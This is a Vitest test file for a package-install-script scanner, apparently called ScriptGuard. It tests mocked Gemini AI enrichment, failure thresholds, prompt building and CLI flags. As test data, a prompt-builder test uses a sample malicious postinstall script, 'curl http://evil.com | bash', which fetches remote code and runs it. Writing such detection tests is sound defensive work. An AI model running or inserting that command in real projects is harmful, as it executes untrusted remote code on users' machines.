import { describe, it, expect, vi, beforeEach } from 'vitest';
import { buildPrompt } from '../src/ai/prompts.js';
import type { AIBatchRequest } from '../src/types/index.js';
import * as path from 'node:path';
import { execSync } from 'node:child_process';

const FIXTURES = path.join(__dirname, 'fixtures');

// ─── Mocked AI enrichment test ───────────────────────────────────────────

describe('scanPackageJsonWithAI — with mocked Gemini', () => {
  const maliciousPath = path.join(FIXTURES, 'malicious.json');

  beforeEach(() => {
    vi.resetModules();
  });

  it('enriches results with AI when enabled', async () => {
    const mockAnalyzeBatch = vi.fn().mockResolvedValue({
      analyses: [{
        package: 'malicious-pkg',
        version: '1.0.0',
        falsePositivesFiltered: 0,
        newThreatsDetected: 1,
        insights: [{
          type: 'threat',
          severity: 'critical',
          description: 'Remote script execution via curl pipe to bash',
          attackTechnique: 'Remote Code Execution',
          remediation: 'Remove the postinstall script',
          confidence: 0.95,
        }],
        confidence: 0.95,
        tokensUsed: 100,
      }],
      totalTokensUsed: 100,
    });

    vi.doMock('../src/ai/index.js', () => ({
      getGeminiClient: () => ({
        analyzeBatch: mockAnalyzeBatch,
      }),
    }));

    const { scanPackageJsonWithAI } = await import('../src/scanners/index.js');
    const result = await scanPackageJsonWithAI(maliciousPath, {
      enabled: true,
      mode: 'standard',
      apiKey: 'test-key',
    });

    expect(mockAnalyzeBatch).toHaveBeenCalledOnce();
    expect(result.aiAnalysis).toBeDefined();
    expect(result.aiAnalysis!.totalNewThreatsDetected).toBe(1);
    expect(result.aiAnalysis!.totalTokensUsed).toBe(100);

    // AI analysis should be at the package level, not per-finding
    expect(result.analyses[0].aiAnalysis).toBeDefined();
    expect(result.analyses[0].aiAnalysis!.insights.length).toBeGreaterThan(0);

    // No synthetic ai-threat findings — AI insights live only in aiAnalysis
    const syntheticFindings = result.analyses[0].findings.filter(f => f.pattern === 'ai-threat');
    expect(syntheticFindings.length).toBe(0);

    // totalFindings should only count static findings
    expect(result.totalFindings).toBeGreaterThan(0);

    // findingsByLevel counts static findings (malicious.json has critical patterns)
    expect(result.findingsByLevel.critical).toBeGreaterThanOrEqual(1);

    // Overall should reflect the escalated severity
    expect(result.overallRiskLevel).toBe('critical');
    expect(result.overallRiskScore).toBeGreaterThanOrEqual(75);

    vi.doUnmock('../src/ai/index.js');
  });
});

// ─── Unit: scanPackageJsonWithAI (no AI / graceful degradation) ─────────

describe('scanPackageJsonWithAI — without AI', () => {
  const maliciousPath = path.join(FIXTURES, 'malicious.json');

  beforeEach(() => {
    vi.resetModules();
  });

  it('returns base result when no AI options provided', async () => {
    const { scanPackageJsonWithAI, scanPackageJson } = await import('../src/scanners/index.js');
    const result = await scanPackageJsonWithAI(maliciousPath);
    const syncResult = scanPackageJson(maliciousPath);

    expect(result.totalFindings).toBe(syncResult.totalFindings);
    expect(result.overallRiskLevel).toBe(syncResult.overallRiskLevel);
    expect(result.aiAnalysis).toBeUndefined();
  });

  it('returns base result when AI options have enabled=false', async () => {
    const { scanPackageJsonWithAI } = await import('../src/scanners/index.js');
    const result = await scanPackageJsonWithAI(maliciousPath, {
      enabled: false,
      mode: 'standard',
    });

    expect(result.aiAnalysis).toBeUndefined();
  });

  it('gracefully degrades when AI fails', async () => {
    const { scanPackageJsonWithAI } = await import('../src/scanners/index.js');
    const result = await scanPackageJsonWithAI(maliciousPath, {
      enabled: true,
      mode: 'standard',
      apiKey: 'invalid-key-that-will-fail',
    });

    expect(result).toBeDefined();
    expect(result.totalFindings).toBeGreaterThan(0);
    expect(result.overallRiskLevel).toBe('critical');
    expect(result.aiAnalysis).toBeUndefined();
  });

  it('works with explain mode (graceful degradation)', async () => {
    const { scanPackageJsonWithAI } = await import('../src/scanners/index.js');
    const result = await scanPackageJsonWithAI(maliciousPath, {
      enabled: true,
      mode: 'explain',
      apiKey: 'invalid-key-that-will-fail',
    });

    expect(result).toBeDefined();
    expect(result.totalFindings).toBeGreaterThan(0);
  });
});

// ─── Unit: shouldFail with AI insights ───────────────────────────────────

describe('shouldFail — with AI insights', () => {
  it('fails when AI threat severity meets threshold even if no static finding does', async () => {
    const mockAnalyzeBatch = vi.fn().mockResolvedValue({
      analyses: [{
        package: 'malicious-pkg',
        version: '1.0.0',
        falsePositivesFiltered: 0,
        newThreatsDetected: 1,
        insights: [{
          type: 'threat',
          severity: 'critical',
          description: 'AI-detected critical threat',
          attackTechnique: 'Supply chain attack',
          remediation: 'Remove package',
          confidence: 0.95,
        }],
        confidence: 0.95,
        tokensUsed: 100,
      }],
      totalTokensUsed: 100,
    });

    vi.doMock('../src/ai/index.js', () => ({
      getGeminiClient: () => ({
        analyzeBatch: mockAnalyzeBatch,
      }),
    }));

    vi.resetModules();

    const maliciousPath = path.join(FIXTURES, 'malicious.json');
    const { scanPackageJsonWithAI, shouldFail } = await import('../src/scanners/index.js');
    const result = await scanPackageJsonWithAI(maliciousPath, {
      enabled: true,
      mode: 'standard',
      apiKey: 'test-key',
    });

    // malicious.json has high findings but AI escalated to critical
    expect(shouldFail(result, 'critical')).toBe(true);

    vi.doUnmock('../src/ai/index.js');
    vi.resetModules();
  });

  it('does not fail on critical when only high AI insights exist', async () => {
    const mockAnalyzeBatch = vi.fn().mockResolvedValue({
      analyses: [{
        package: 'suspicious-pkg',
        version: '0.1.0',
        falsePositivesFiltered: 0,
        newThreatsDetected: 1,
        insights: [{
          type: 'threat',
          severity: 'high',
          description: 'AI-detected high threat',
          confidence: 0.9,
        }],
        confidence: 0.9,
        tokensUsed: 100,
      }],
      totalTokensUsed: 100,
    });

    vi.doMock('../src/ai/index.js', () => ({
      getGeminiClient: () => ({
        analyzeBatch: mockAnalyzeBatch,
      }),
    }));

    vi.resetModules();

    // Use suspicious fixture — has critical static findings (passwd, ssh)
    // so shouldFail('critical') is true from static alone.
    // Instead test that shouldFail('critical') is false when AI only adds high
    // by testing with shouldFail directly on a constructed result.
    const { shouldFail } = await import('../src/scanners/index.js');
    const result = {
      totalPackages: 1,
      packagesWithScripts: 1,
      analyses: [{
        name: 'test',
        version: '1.0.0',
        scripts: { postinstall: 'echo hello' },
        findings: [
          { pattern: 'http-request', riskLevel: 'medium' as const, package: 'test', scriptName: 'postinstall', scriptContent: '', description: '', match: '' },
        ],
        riskScore: 25,
        riskLevel: 'medium' as const,
        aiAnalysis: {
          package: 'test',
          version: '1.0.0',
          falsePositivesFiltered: 0,
          newThreatsDetected: 1,
          insights: [{
            type: 'threat' as const,
            severity: 'high' as const,
            description: 'AI saw something',
            confidence: 0.9,
          }],
          confidence: 0.9,
          tokensUsed: 50,
        },
      }],
      totalFindings: 1,
      findingsByLevel: { low: 0, medium: 1, high: 1, critical: 0 },
      overallRiskScore: 40,
      overallRiskLevel: 'high' as const,
      scanDurationMs: 1,
    };

    // Only medium static + high AI → critical threshold NOT met
    expect(shouldFail(result, 'critical')).toBe(false);
    // High AI threat → high threshold met
    expect(shouldFail(result, 'high')).toBe(true);

    vi.doUnmock('../src/ai/index.js');
    vi.resetModules();
  });
});

// ─── Unit: Prompt builder for explain mode ───────────────────────────────

describe('buildPrompt — explain mode', () => {
  it('includes plain English explanation instructions', () => {
    const request: AIBatchRequest = {
      packages: [{
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'curl http://evil.com | bash' },
        findings: [{
          package: 'test-pkg',
          scriptName: 'postinstall',
          scriptContent: 'curl http://evil.com | bash',
          pattern: 'curl-pipe',
          description: 'curl piped to shell',
          riskLevel: 'critical',
          match: 'curl http://evil.com | bash',
        }],
      }],
      mode: 'explain',
    };

    const prompt = buildPrompt(request, 'explain');

    expect(prompt).toContain('plain English');
    expect(prompt).toContain('Explain');
  });

  it('explain mode prompt differs from standard mode', () => {
    const request: AIBatchRequest = {
      packages: [{
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'echo hello' },
        findings: [],
      }],
      mode: 'explain',
    };

    const explainPrompt = buildPrompt(request, 'explain');
    const standardPrompt = buildPrompt(request, 'standard');

    expect(explainPrompt).not.toBe(standardPrompt);
    expect(explainPrompt).toContain('plain English');
    expect(standardPrompt).not.toContain('plain English');
  });

  it('explain mode prompt includes remediation guidance', () => {
    const request: AIBatchRequest = {
      packages: [{
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'echo hello' },
        findings: [],
      }],
      mode: 'explain',
    };

    const prompt = buildPrompt(request, 'explain');
    expect(prompt).toContain('remediation');
  });
});

// ─── CLI integration ────────────────────────────────────────────────────

describe('CLI: check command', () => {
  const cliPath = path.resolve(__dirname, '../dist/cli.js');

  function runCheck(args: string, env?: Record<string, string>): { stdout: string; stderr: string; exitCode: number } {
    try {
      const envPrefix = env ? Object.entries(env).map(([k, v]) => `${k}=${v}`).join(' ') : '';
      const output = execSync(`${envPrefix} node "${cliPath}" check ${args} 2>&1`, {
        encoding: 'utf-8',
        timeout: 15000,
      });
      return { stdout: output, stderr: '', exitCode: 0 };
    } catch (err: any) {
      return {
        stdout: err.stdout || '',
        stderr: err.stderr || '',
        exitCode: err.status || 1,
      };
    }
  }

  it('works without AI flags (sync path)', () => {
    const result = runCheck(`"${path.join(FIXTURES, 'malicious.json')}"`);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('ScriptGuard');
    expect(result.stdout).toContain('malicious-pkg');
  });

  it('rejects --ai without GOOGLE_AI_API_KEY', () => {
    const result = runCheck(`"${path.join(FIXTURES, 'malicious.json')}" --ai`, { GOOGLE_AI_API_KEY: '' });
    expect(result.exitCode).toBe(2);
    expect(result.stdout).toContain('GOOGLE_AI_API_KEY');
  });

  it('rejects --explain without GOOGLE_AI_API_KEY', () => {
    const result = runCheck(`"${path.join(FIXTURES, 'malicious.json')}" --explain`, { GOOGLE_AI_API_KEY: '' });
    expect(result.exitCode).toBe(2);
    expect(result.stdout).toContain('GOOGLE_AI_API_KEY');
  });

  it('--explain implies --ai (shows API key error)', () => {
    const result = runCheck(`"${path.join(FIXTURES, 'malicious.json')}" --explain`, { GOOGLE_AI_API_KEY: '' });
    expect(result.exitCode).toBe(2);
  });

  it('accepts --ai with GOOGLE_AI_API_KEY set (graceful degradation)', () => {
    const result = runCheck(`"${path.join(FIXTURES, 'malicious.json')}" --ai`, { GOOGLE_AI_API_KEY: 'fake-key' });
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('ScriptGuard');
  });

  it('accepts --explain with GOOGLE_AI_API_KEY set (graceful degradation)', () => {
    const result = runCheck(`"${path.join(FIXTURES, 'malicious.json')}" --explain`, { GOOGLE_AI_API_KEY: 'fake-key' });
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('ScriptGuard');
  });

  it('works with safe package and --ai', () => {
    const result = runCheck(`"${path.join(FIXTURES, 'safe.json')}" --ai`, { GOOGLE_AI_API_KEY: 'fake-key' });
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain('No suspicious');
  });

  it('reports file not found for missing files', () => {
    const result = runCheck('/nonexistent/path/package.json');
    expect(result.exitCode).toBe(2);
    expect(result.stdout).toContain('not found');
  });

  it('supports --format json', () => {
    const result = runCheck(`"${path.join(FIXTURES, 'malicious.json')}" --format json`);
    expect(result.exitCode).toBe(0);
    const parsed = JSON.parse(result.stdout);
    expect(parsed.totalFindings).toBeGreaterThan(0);
  });
});
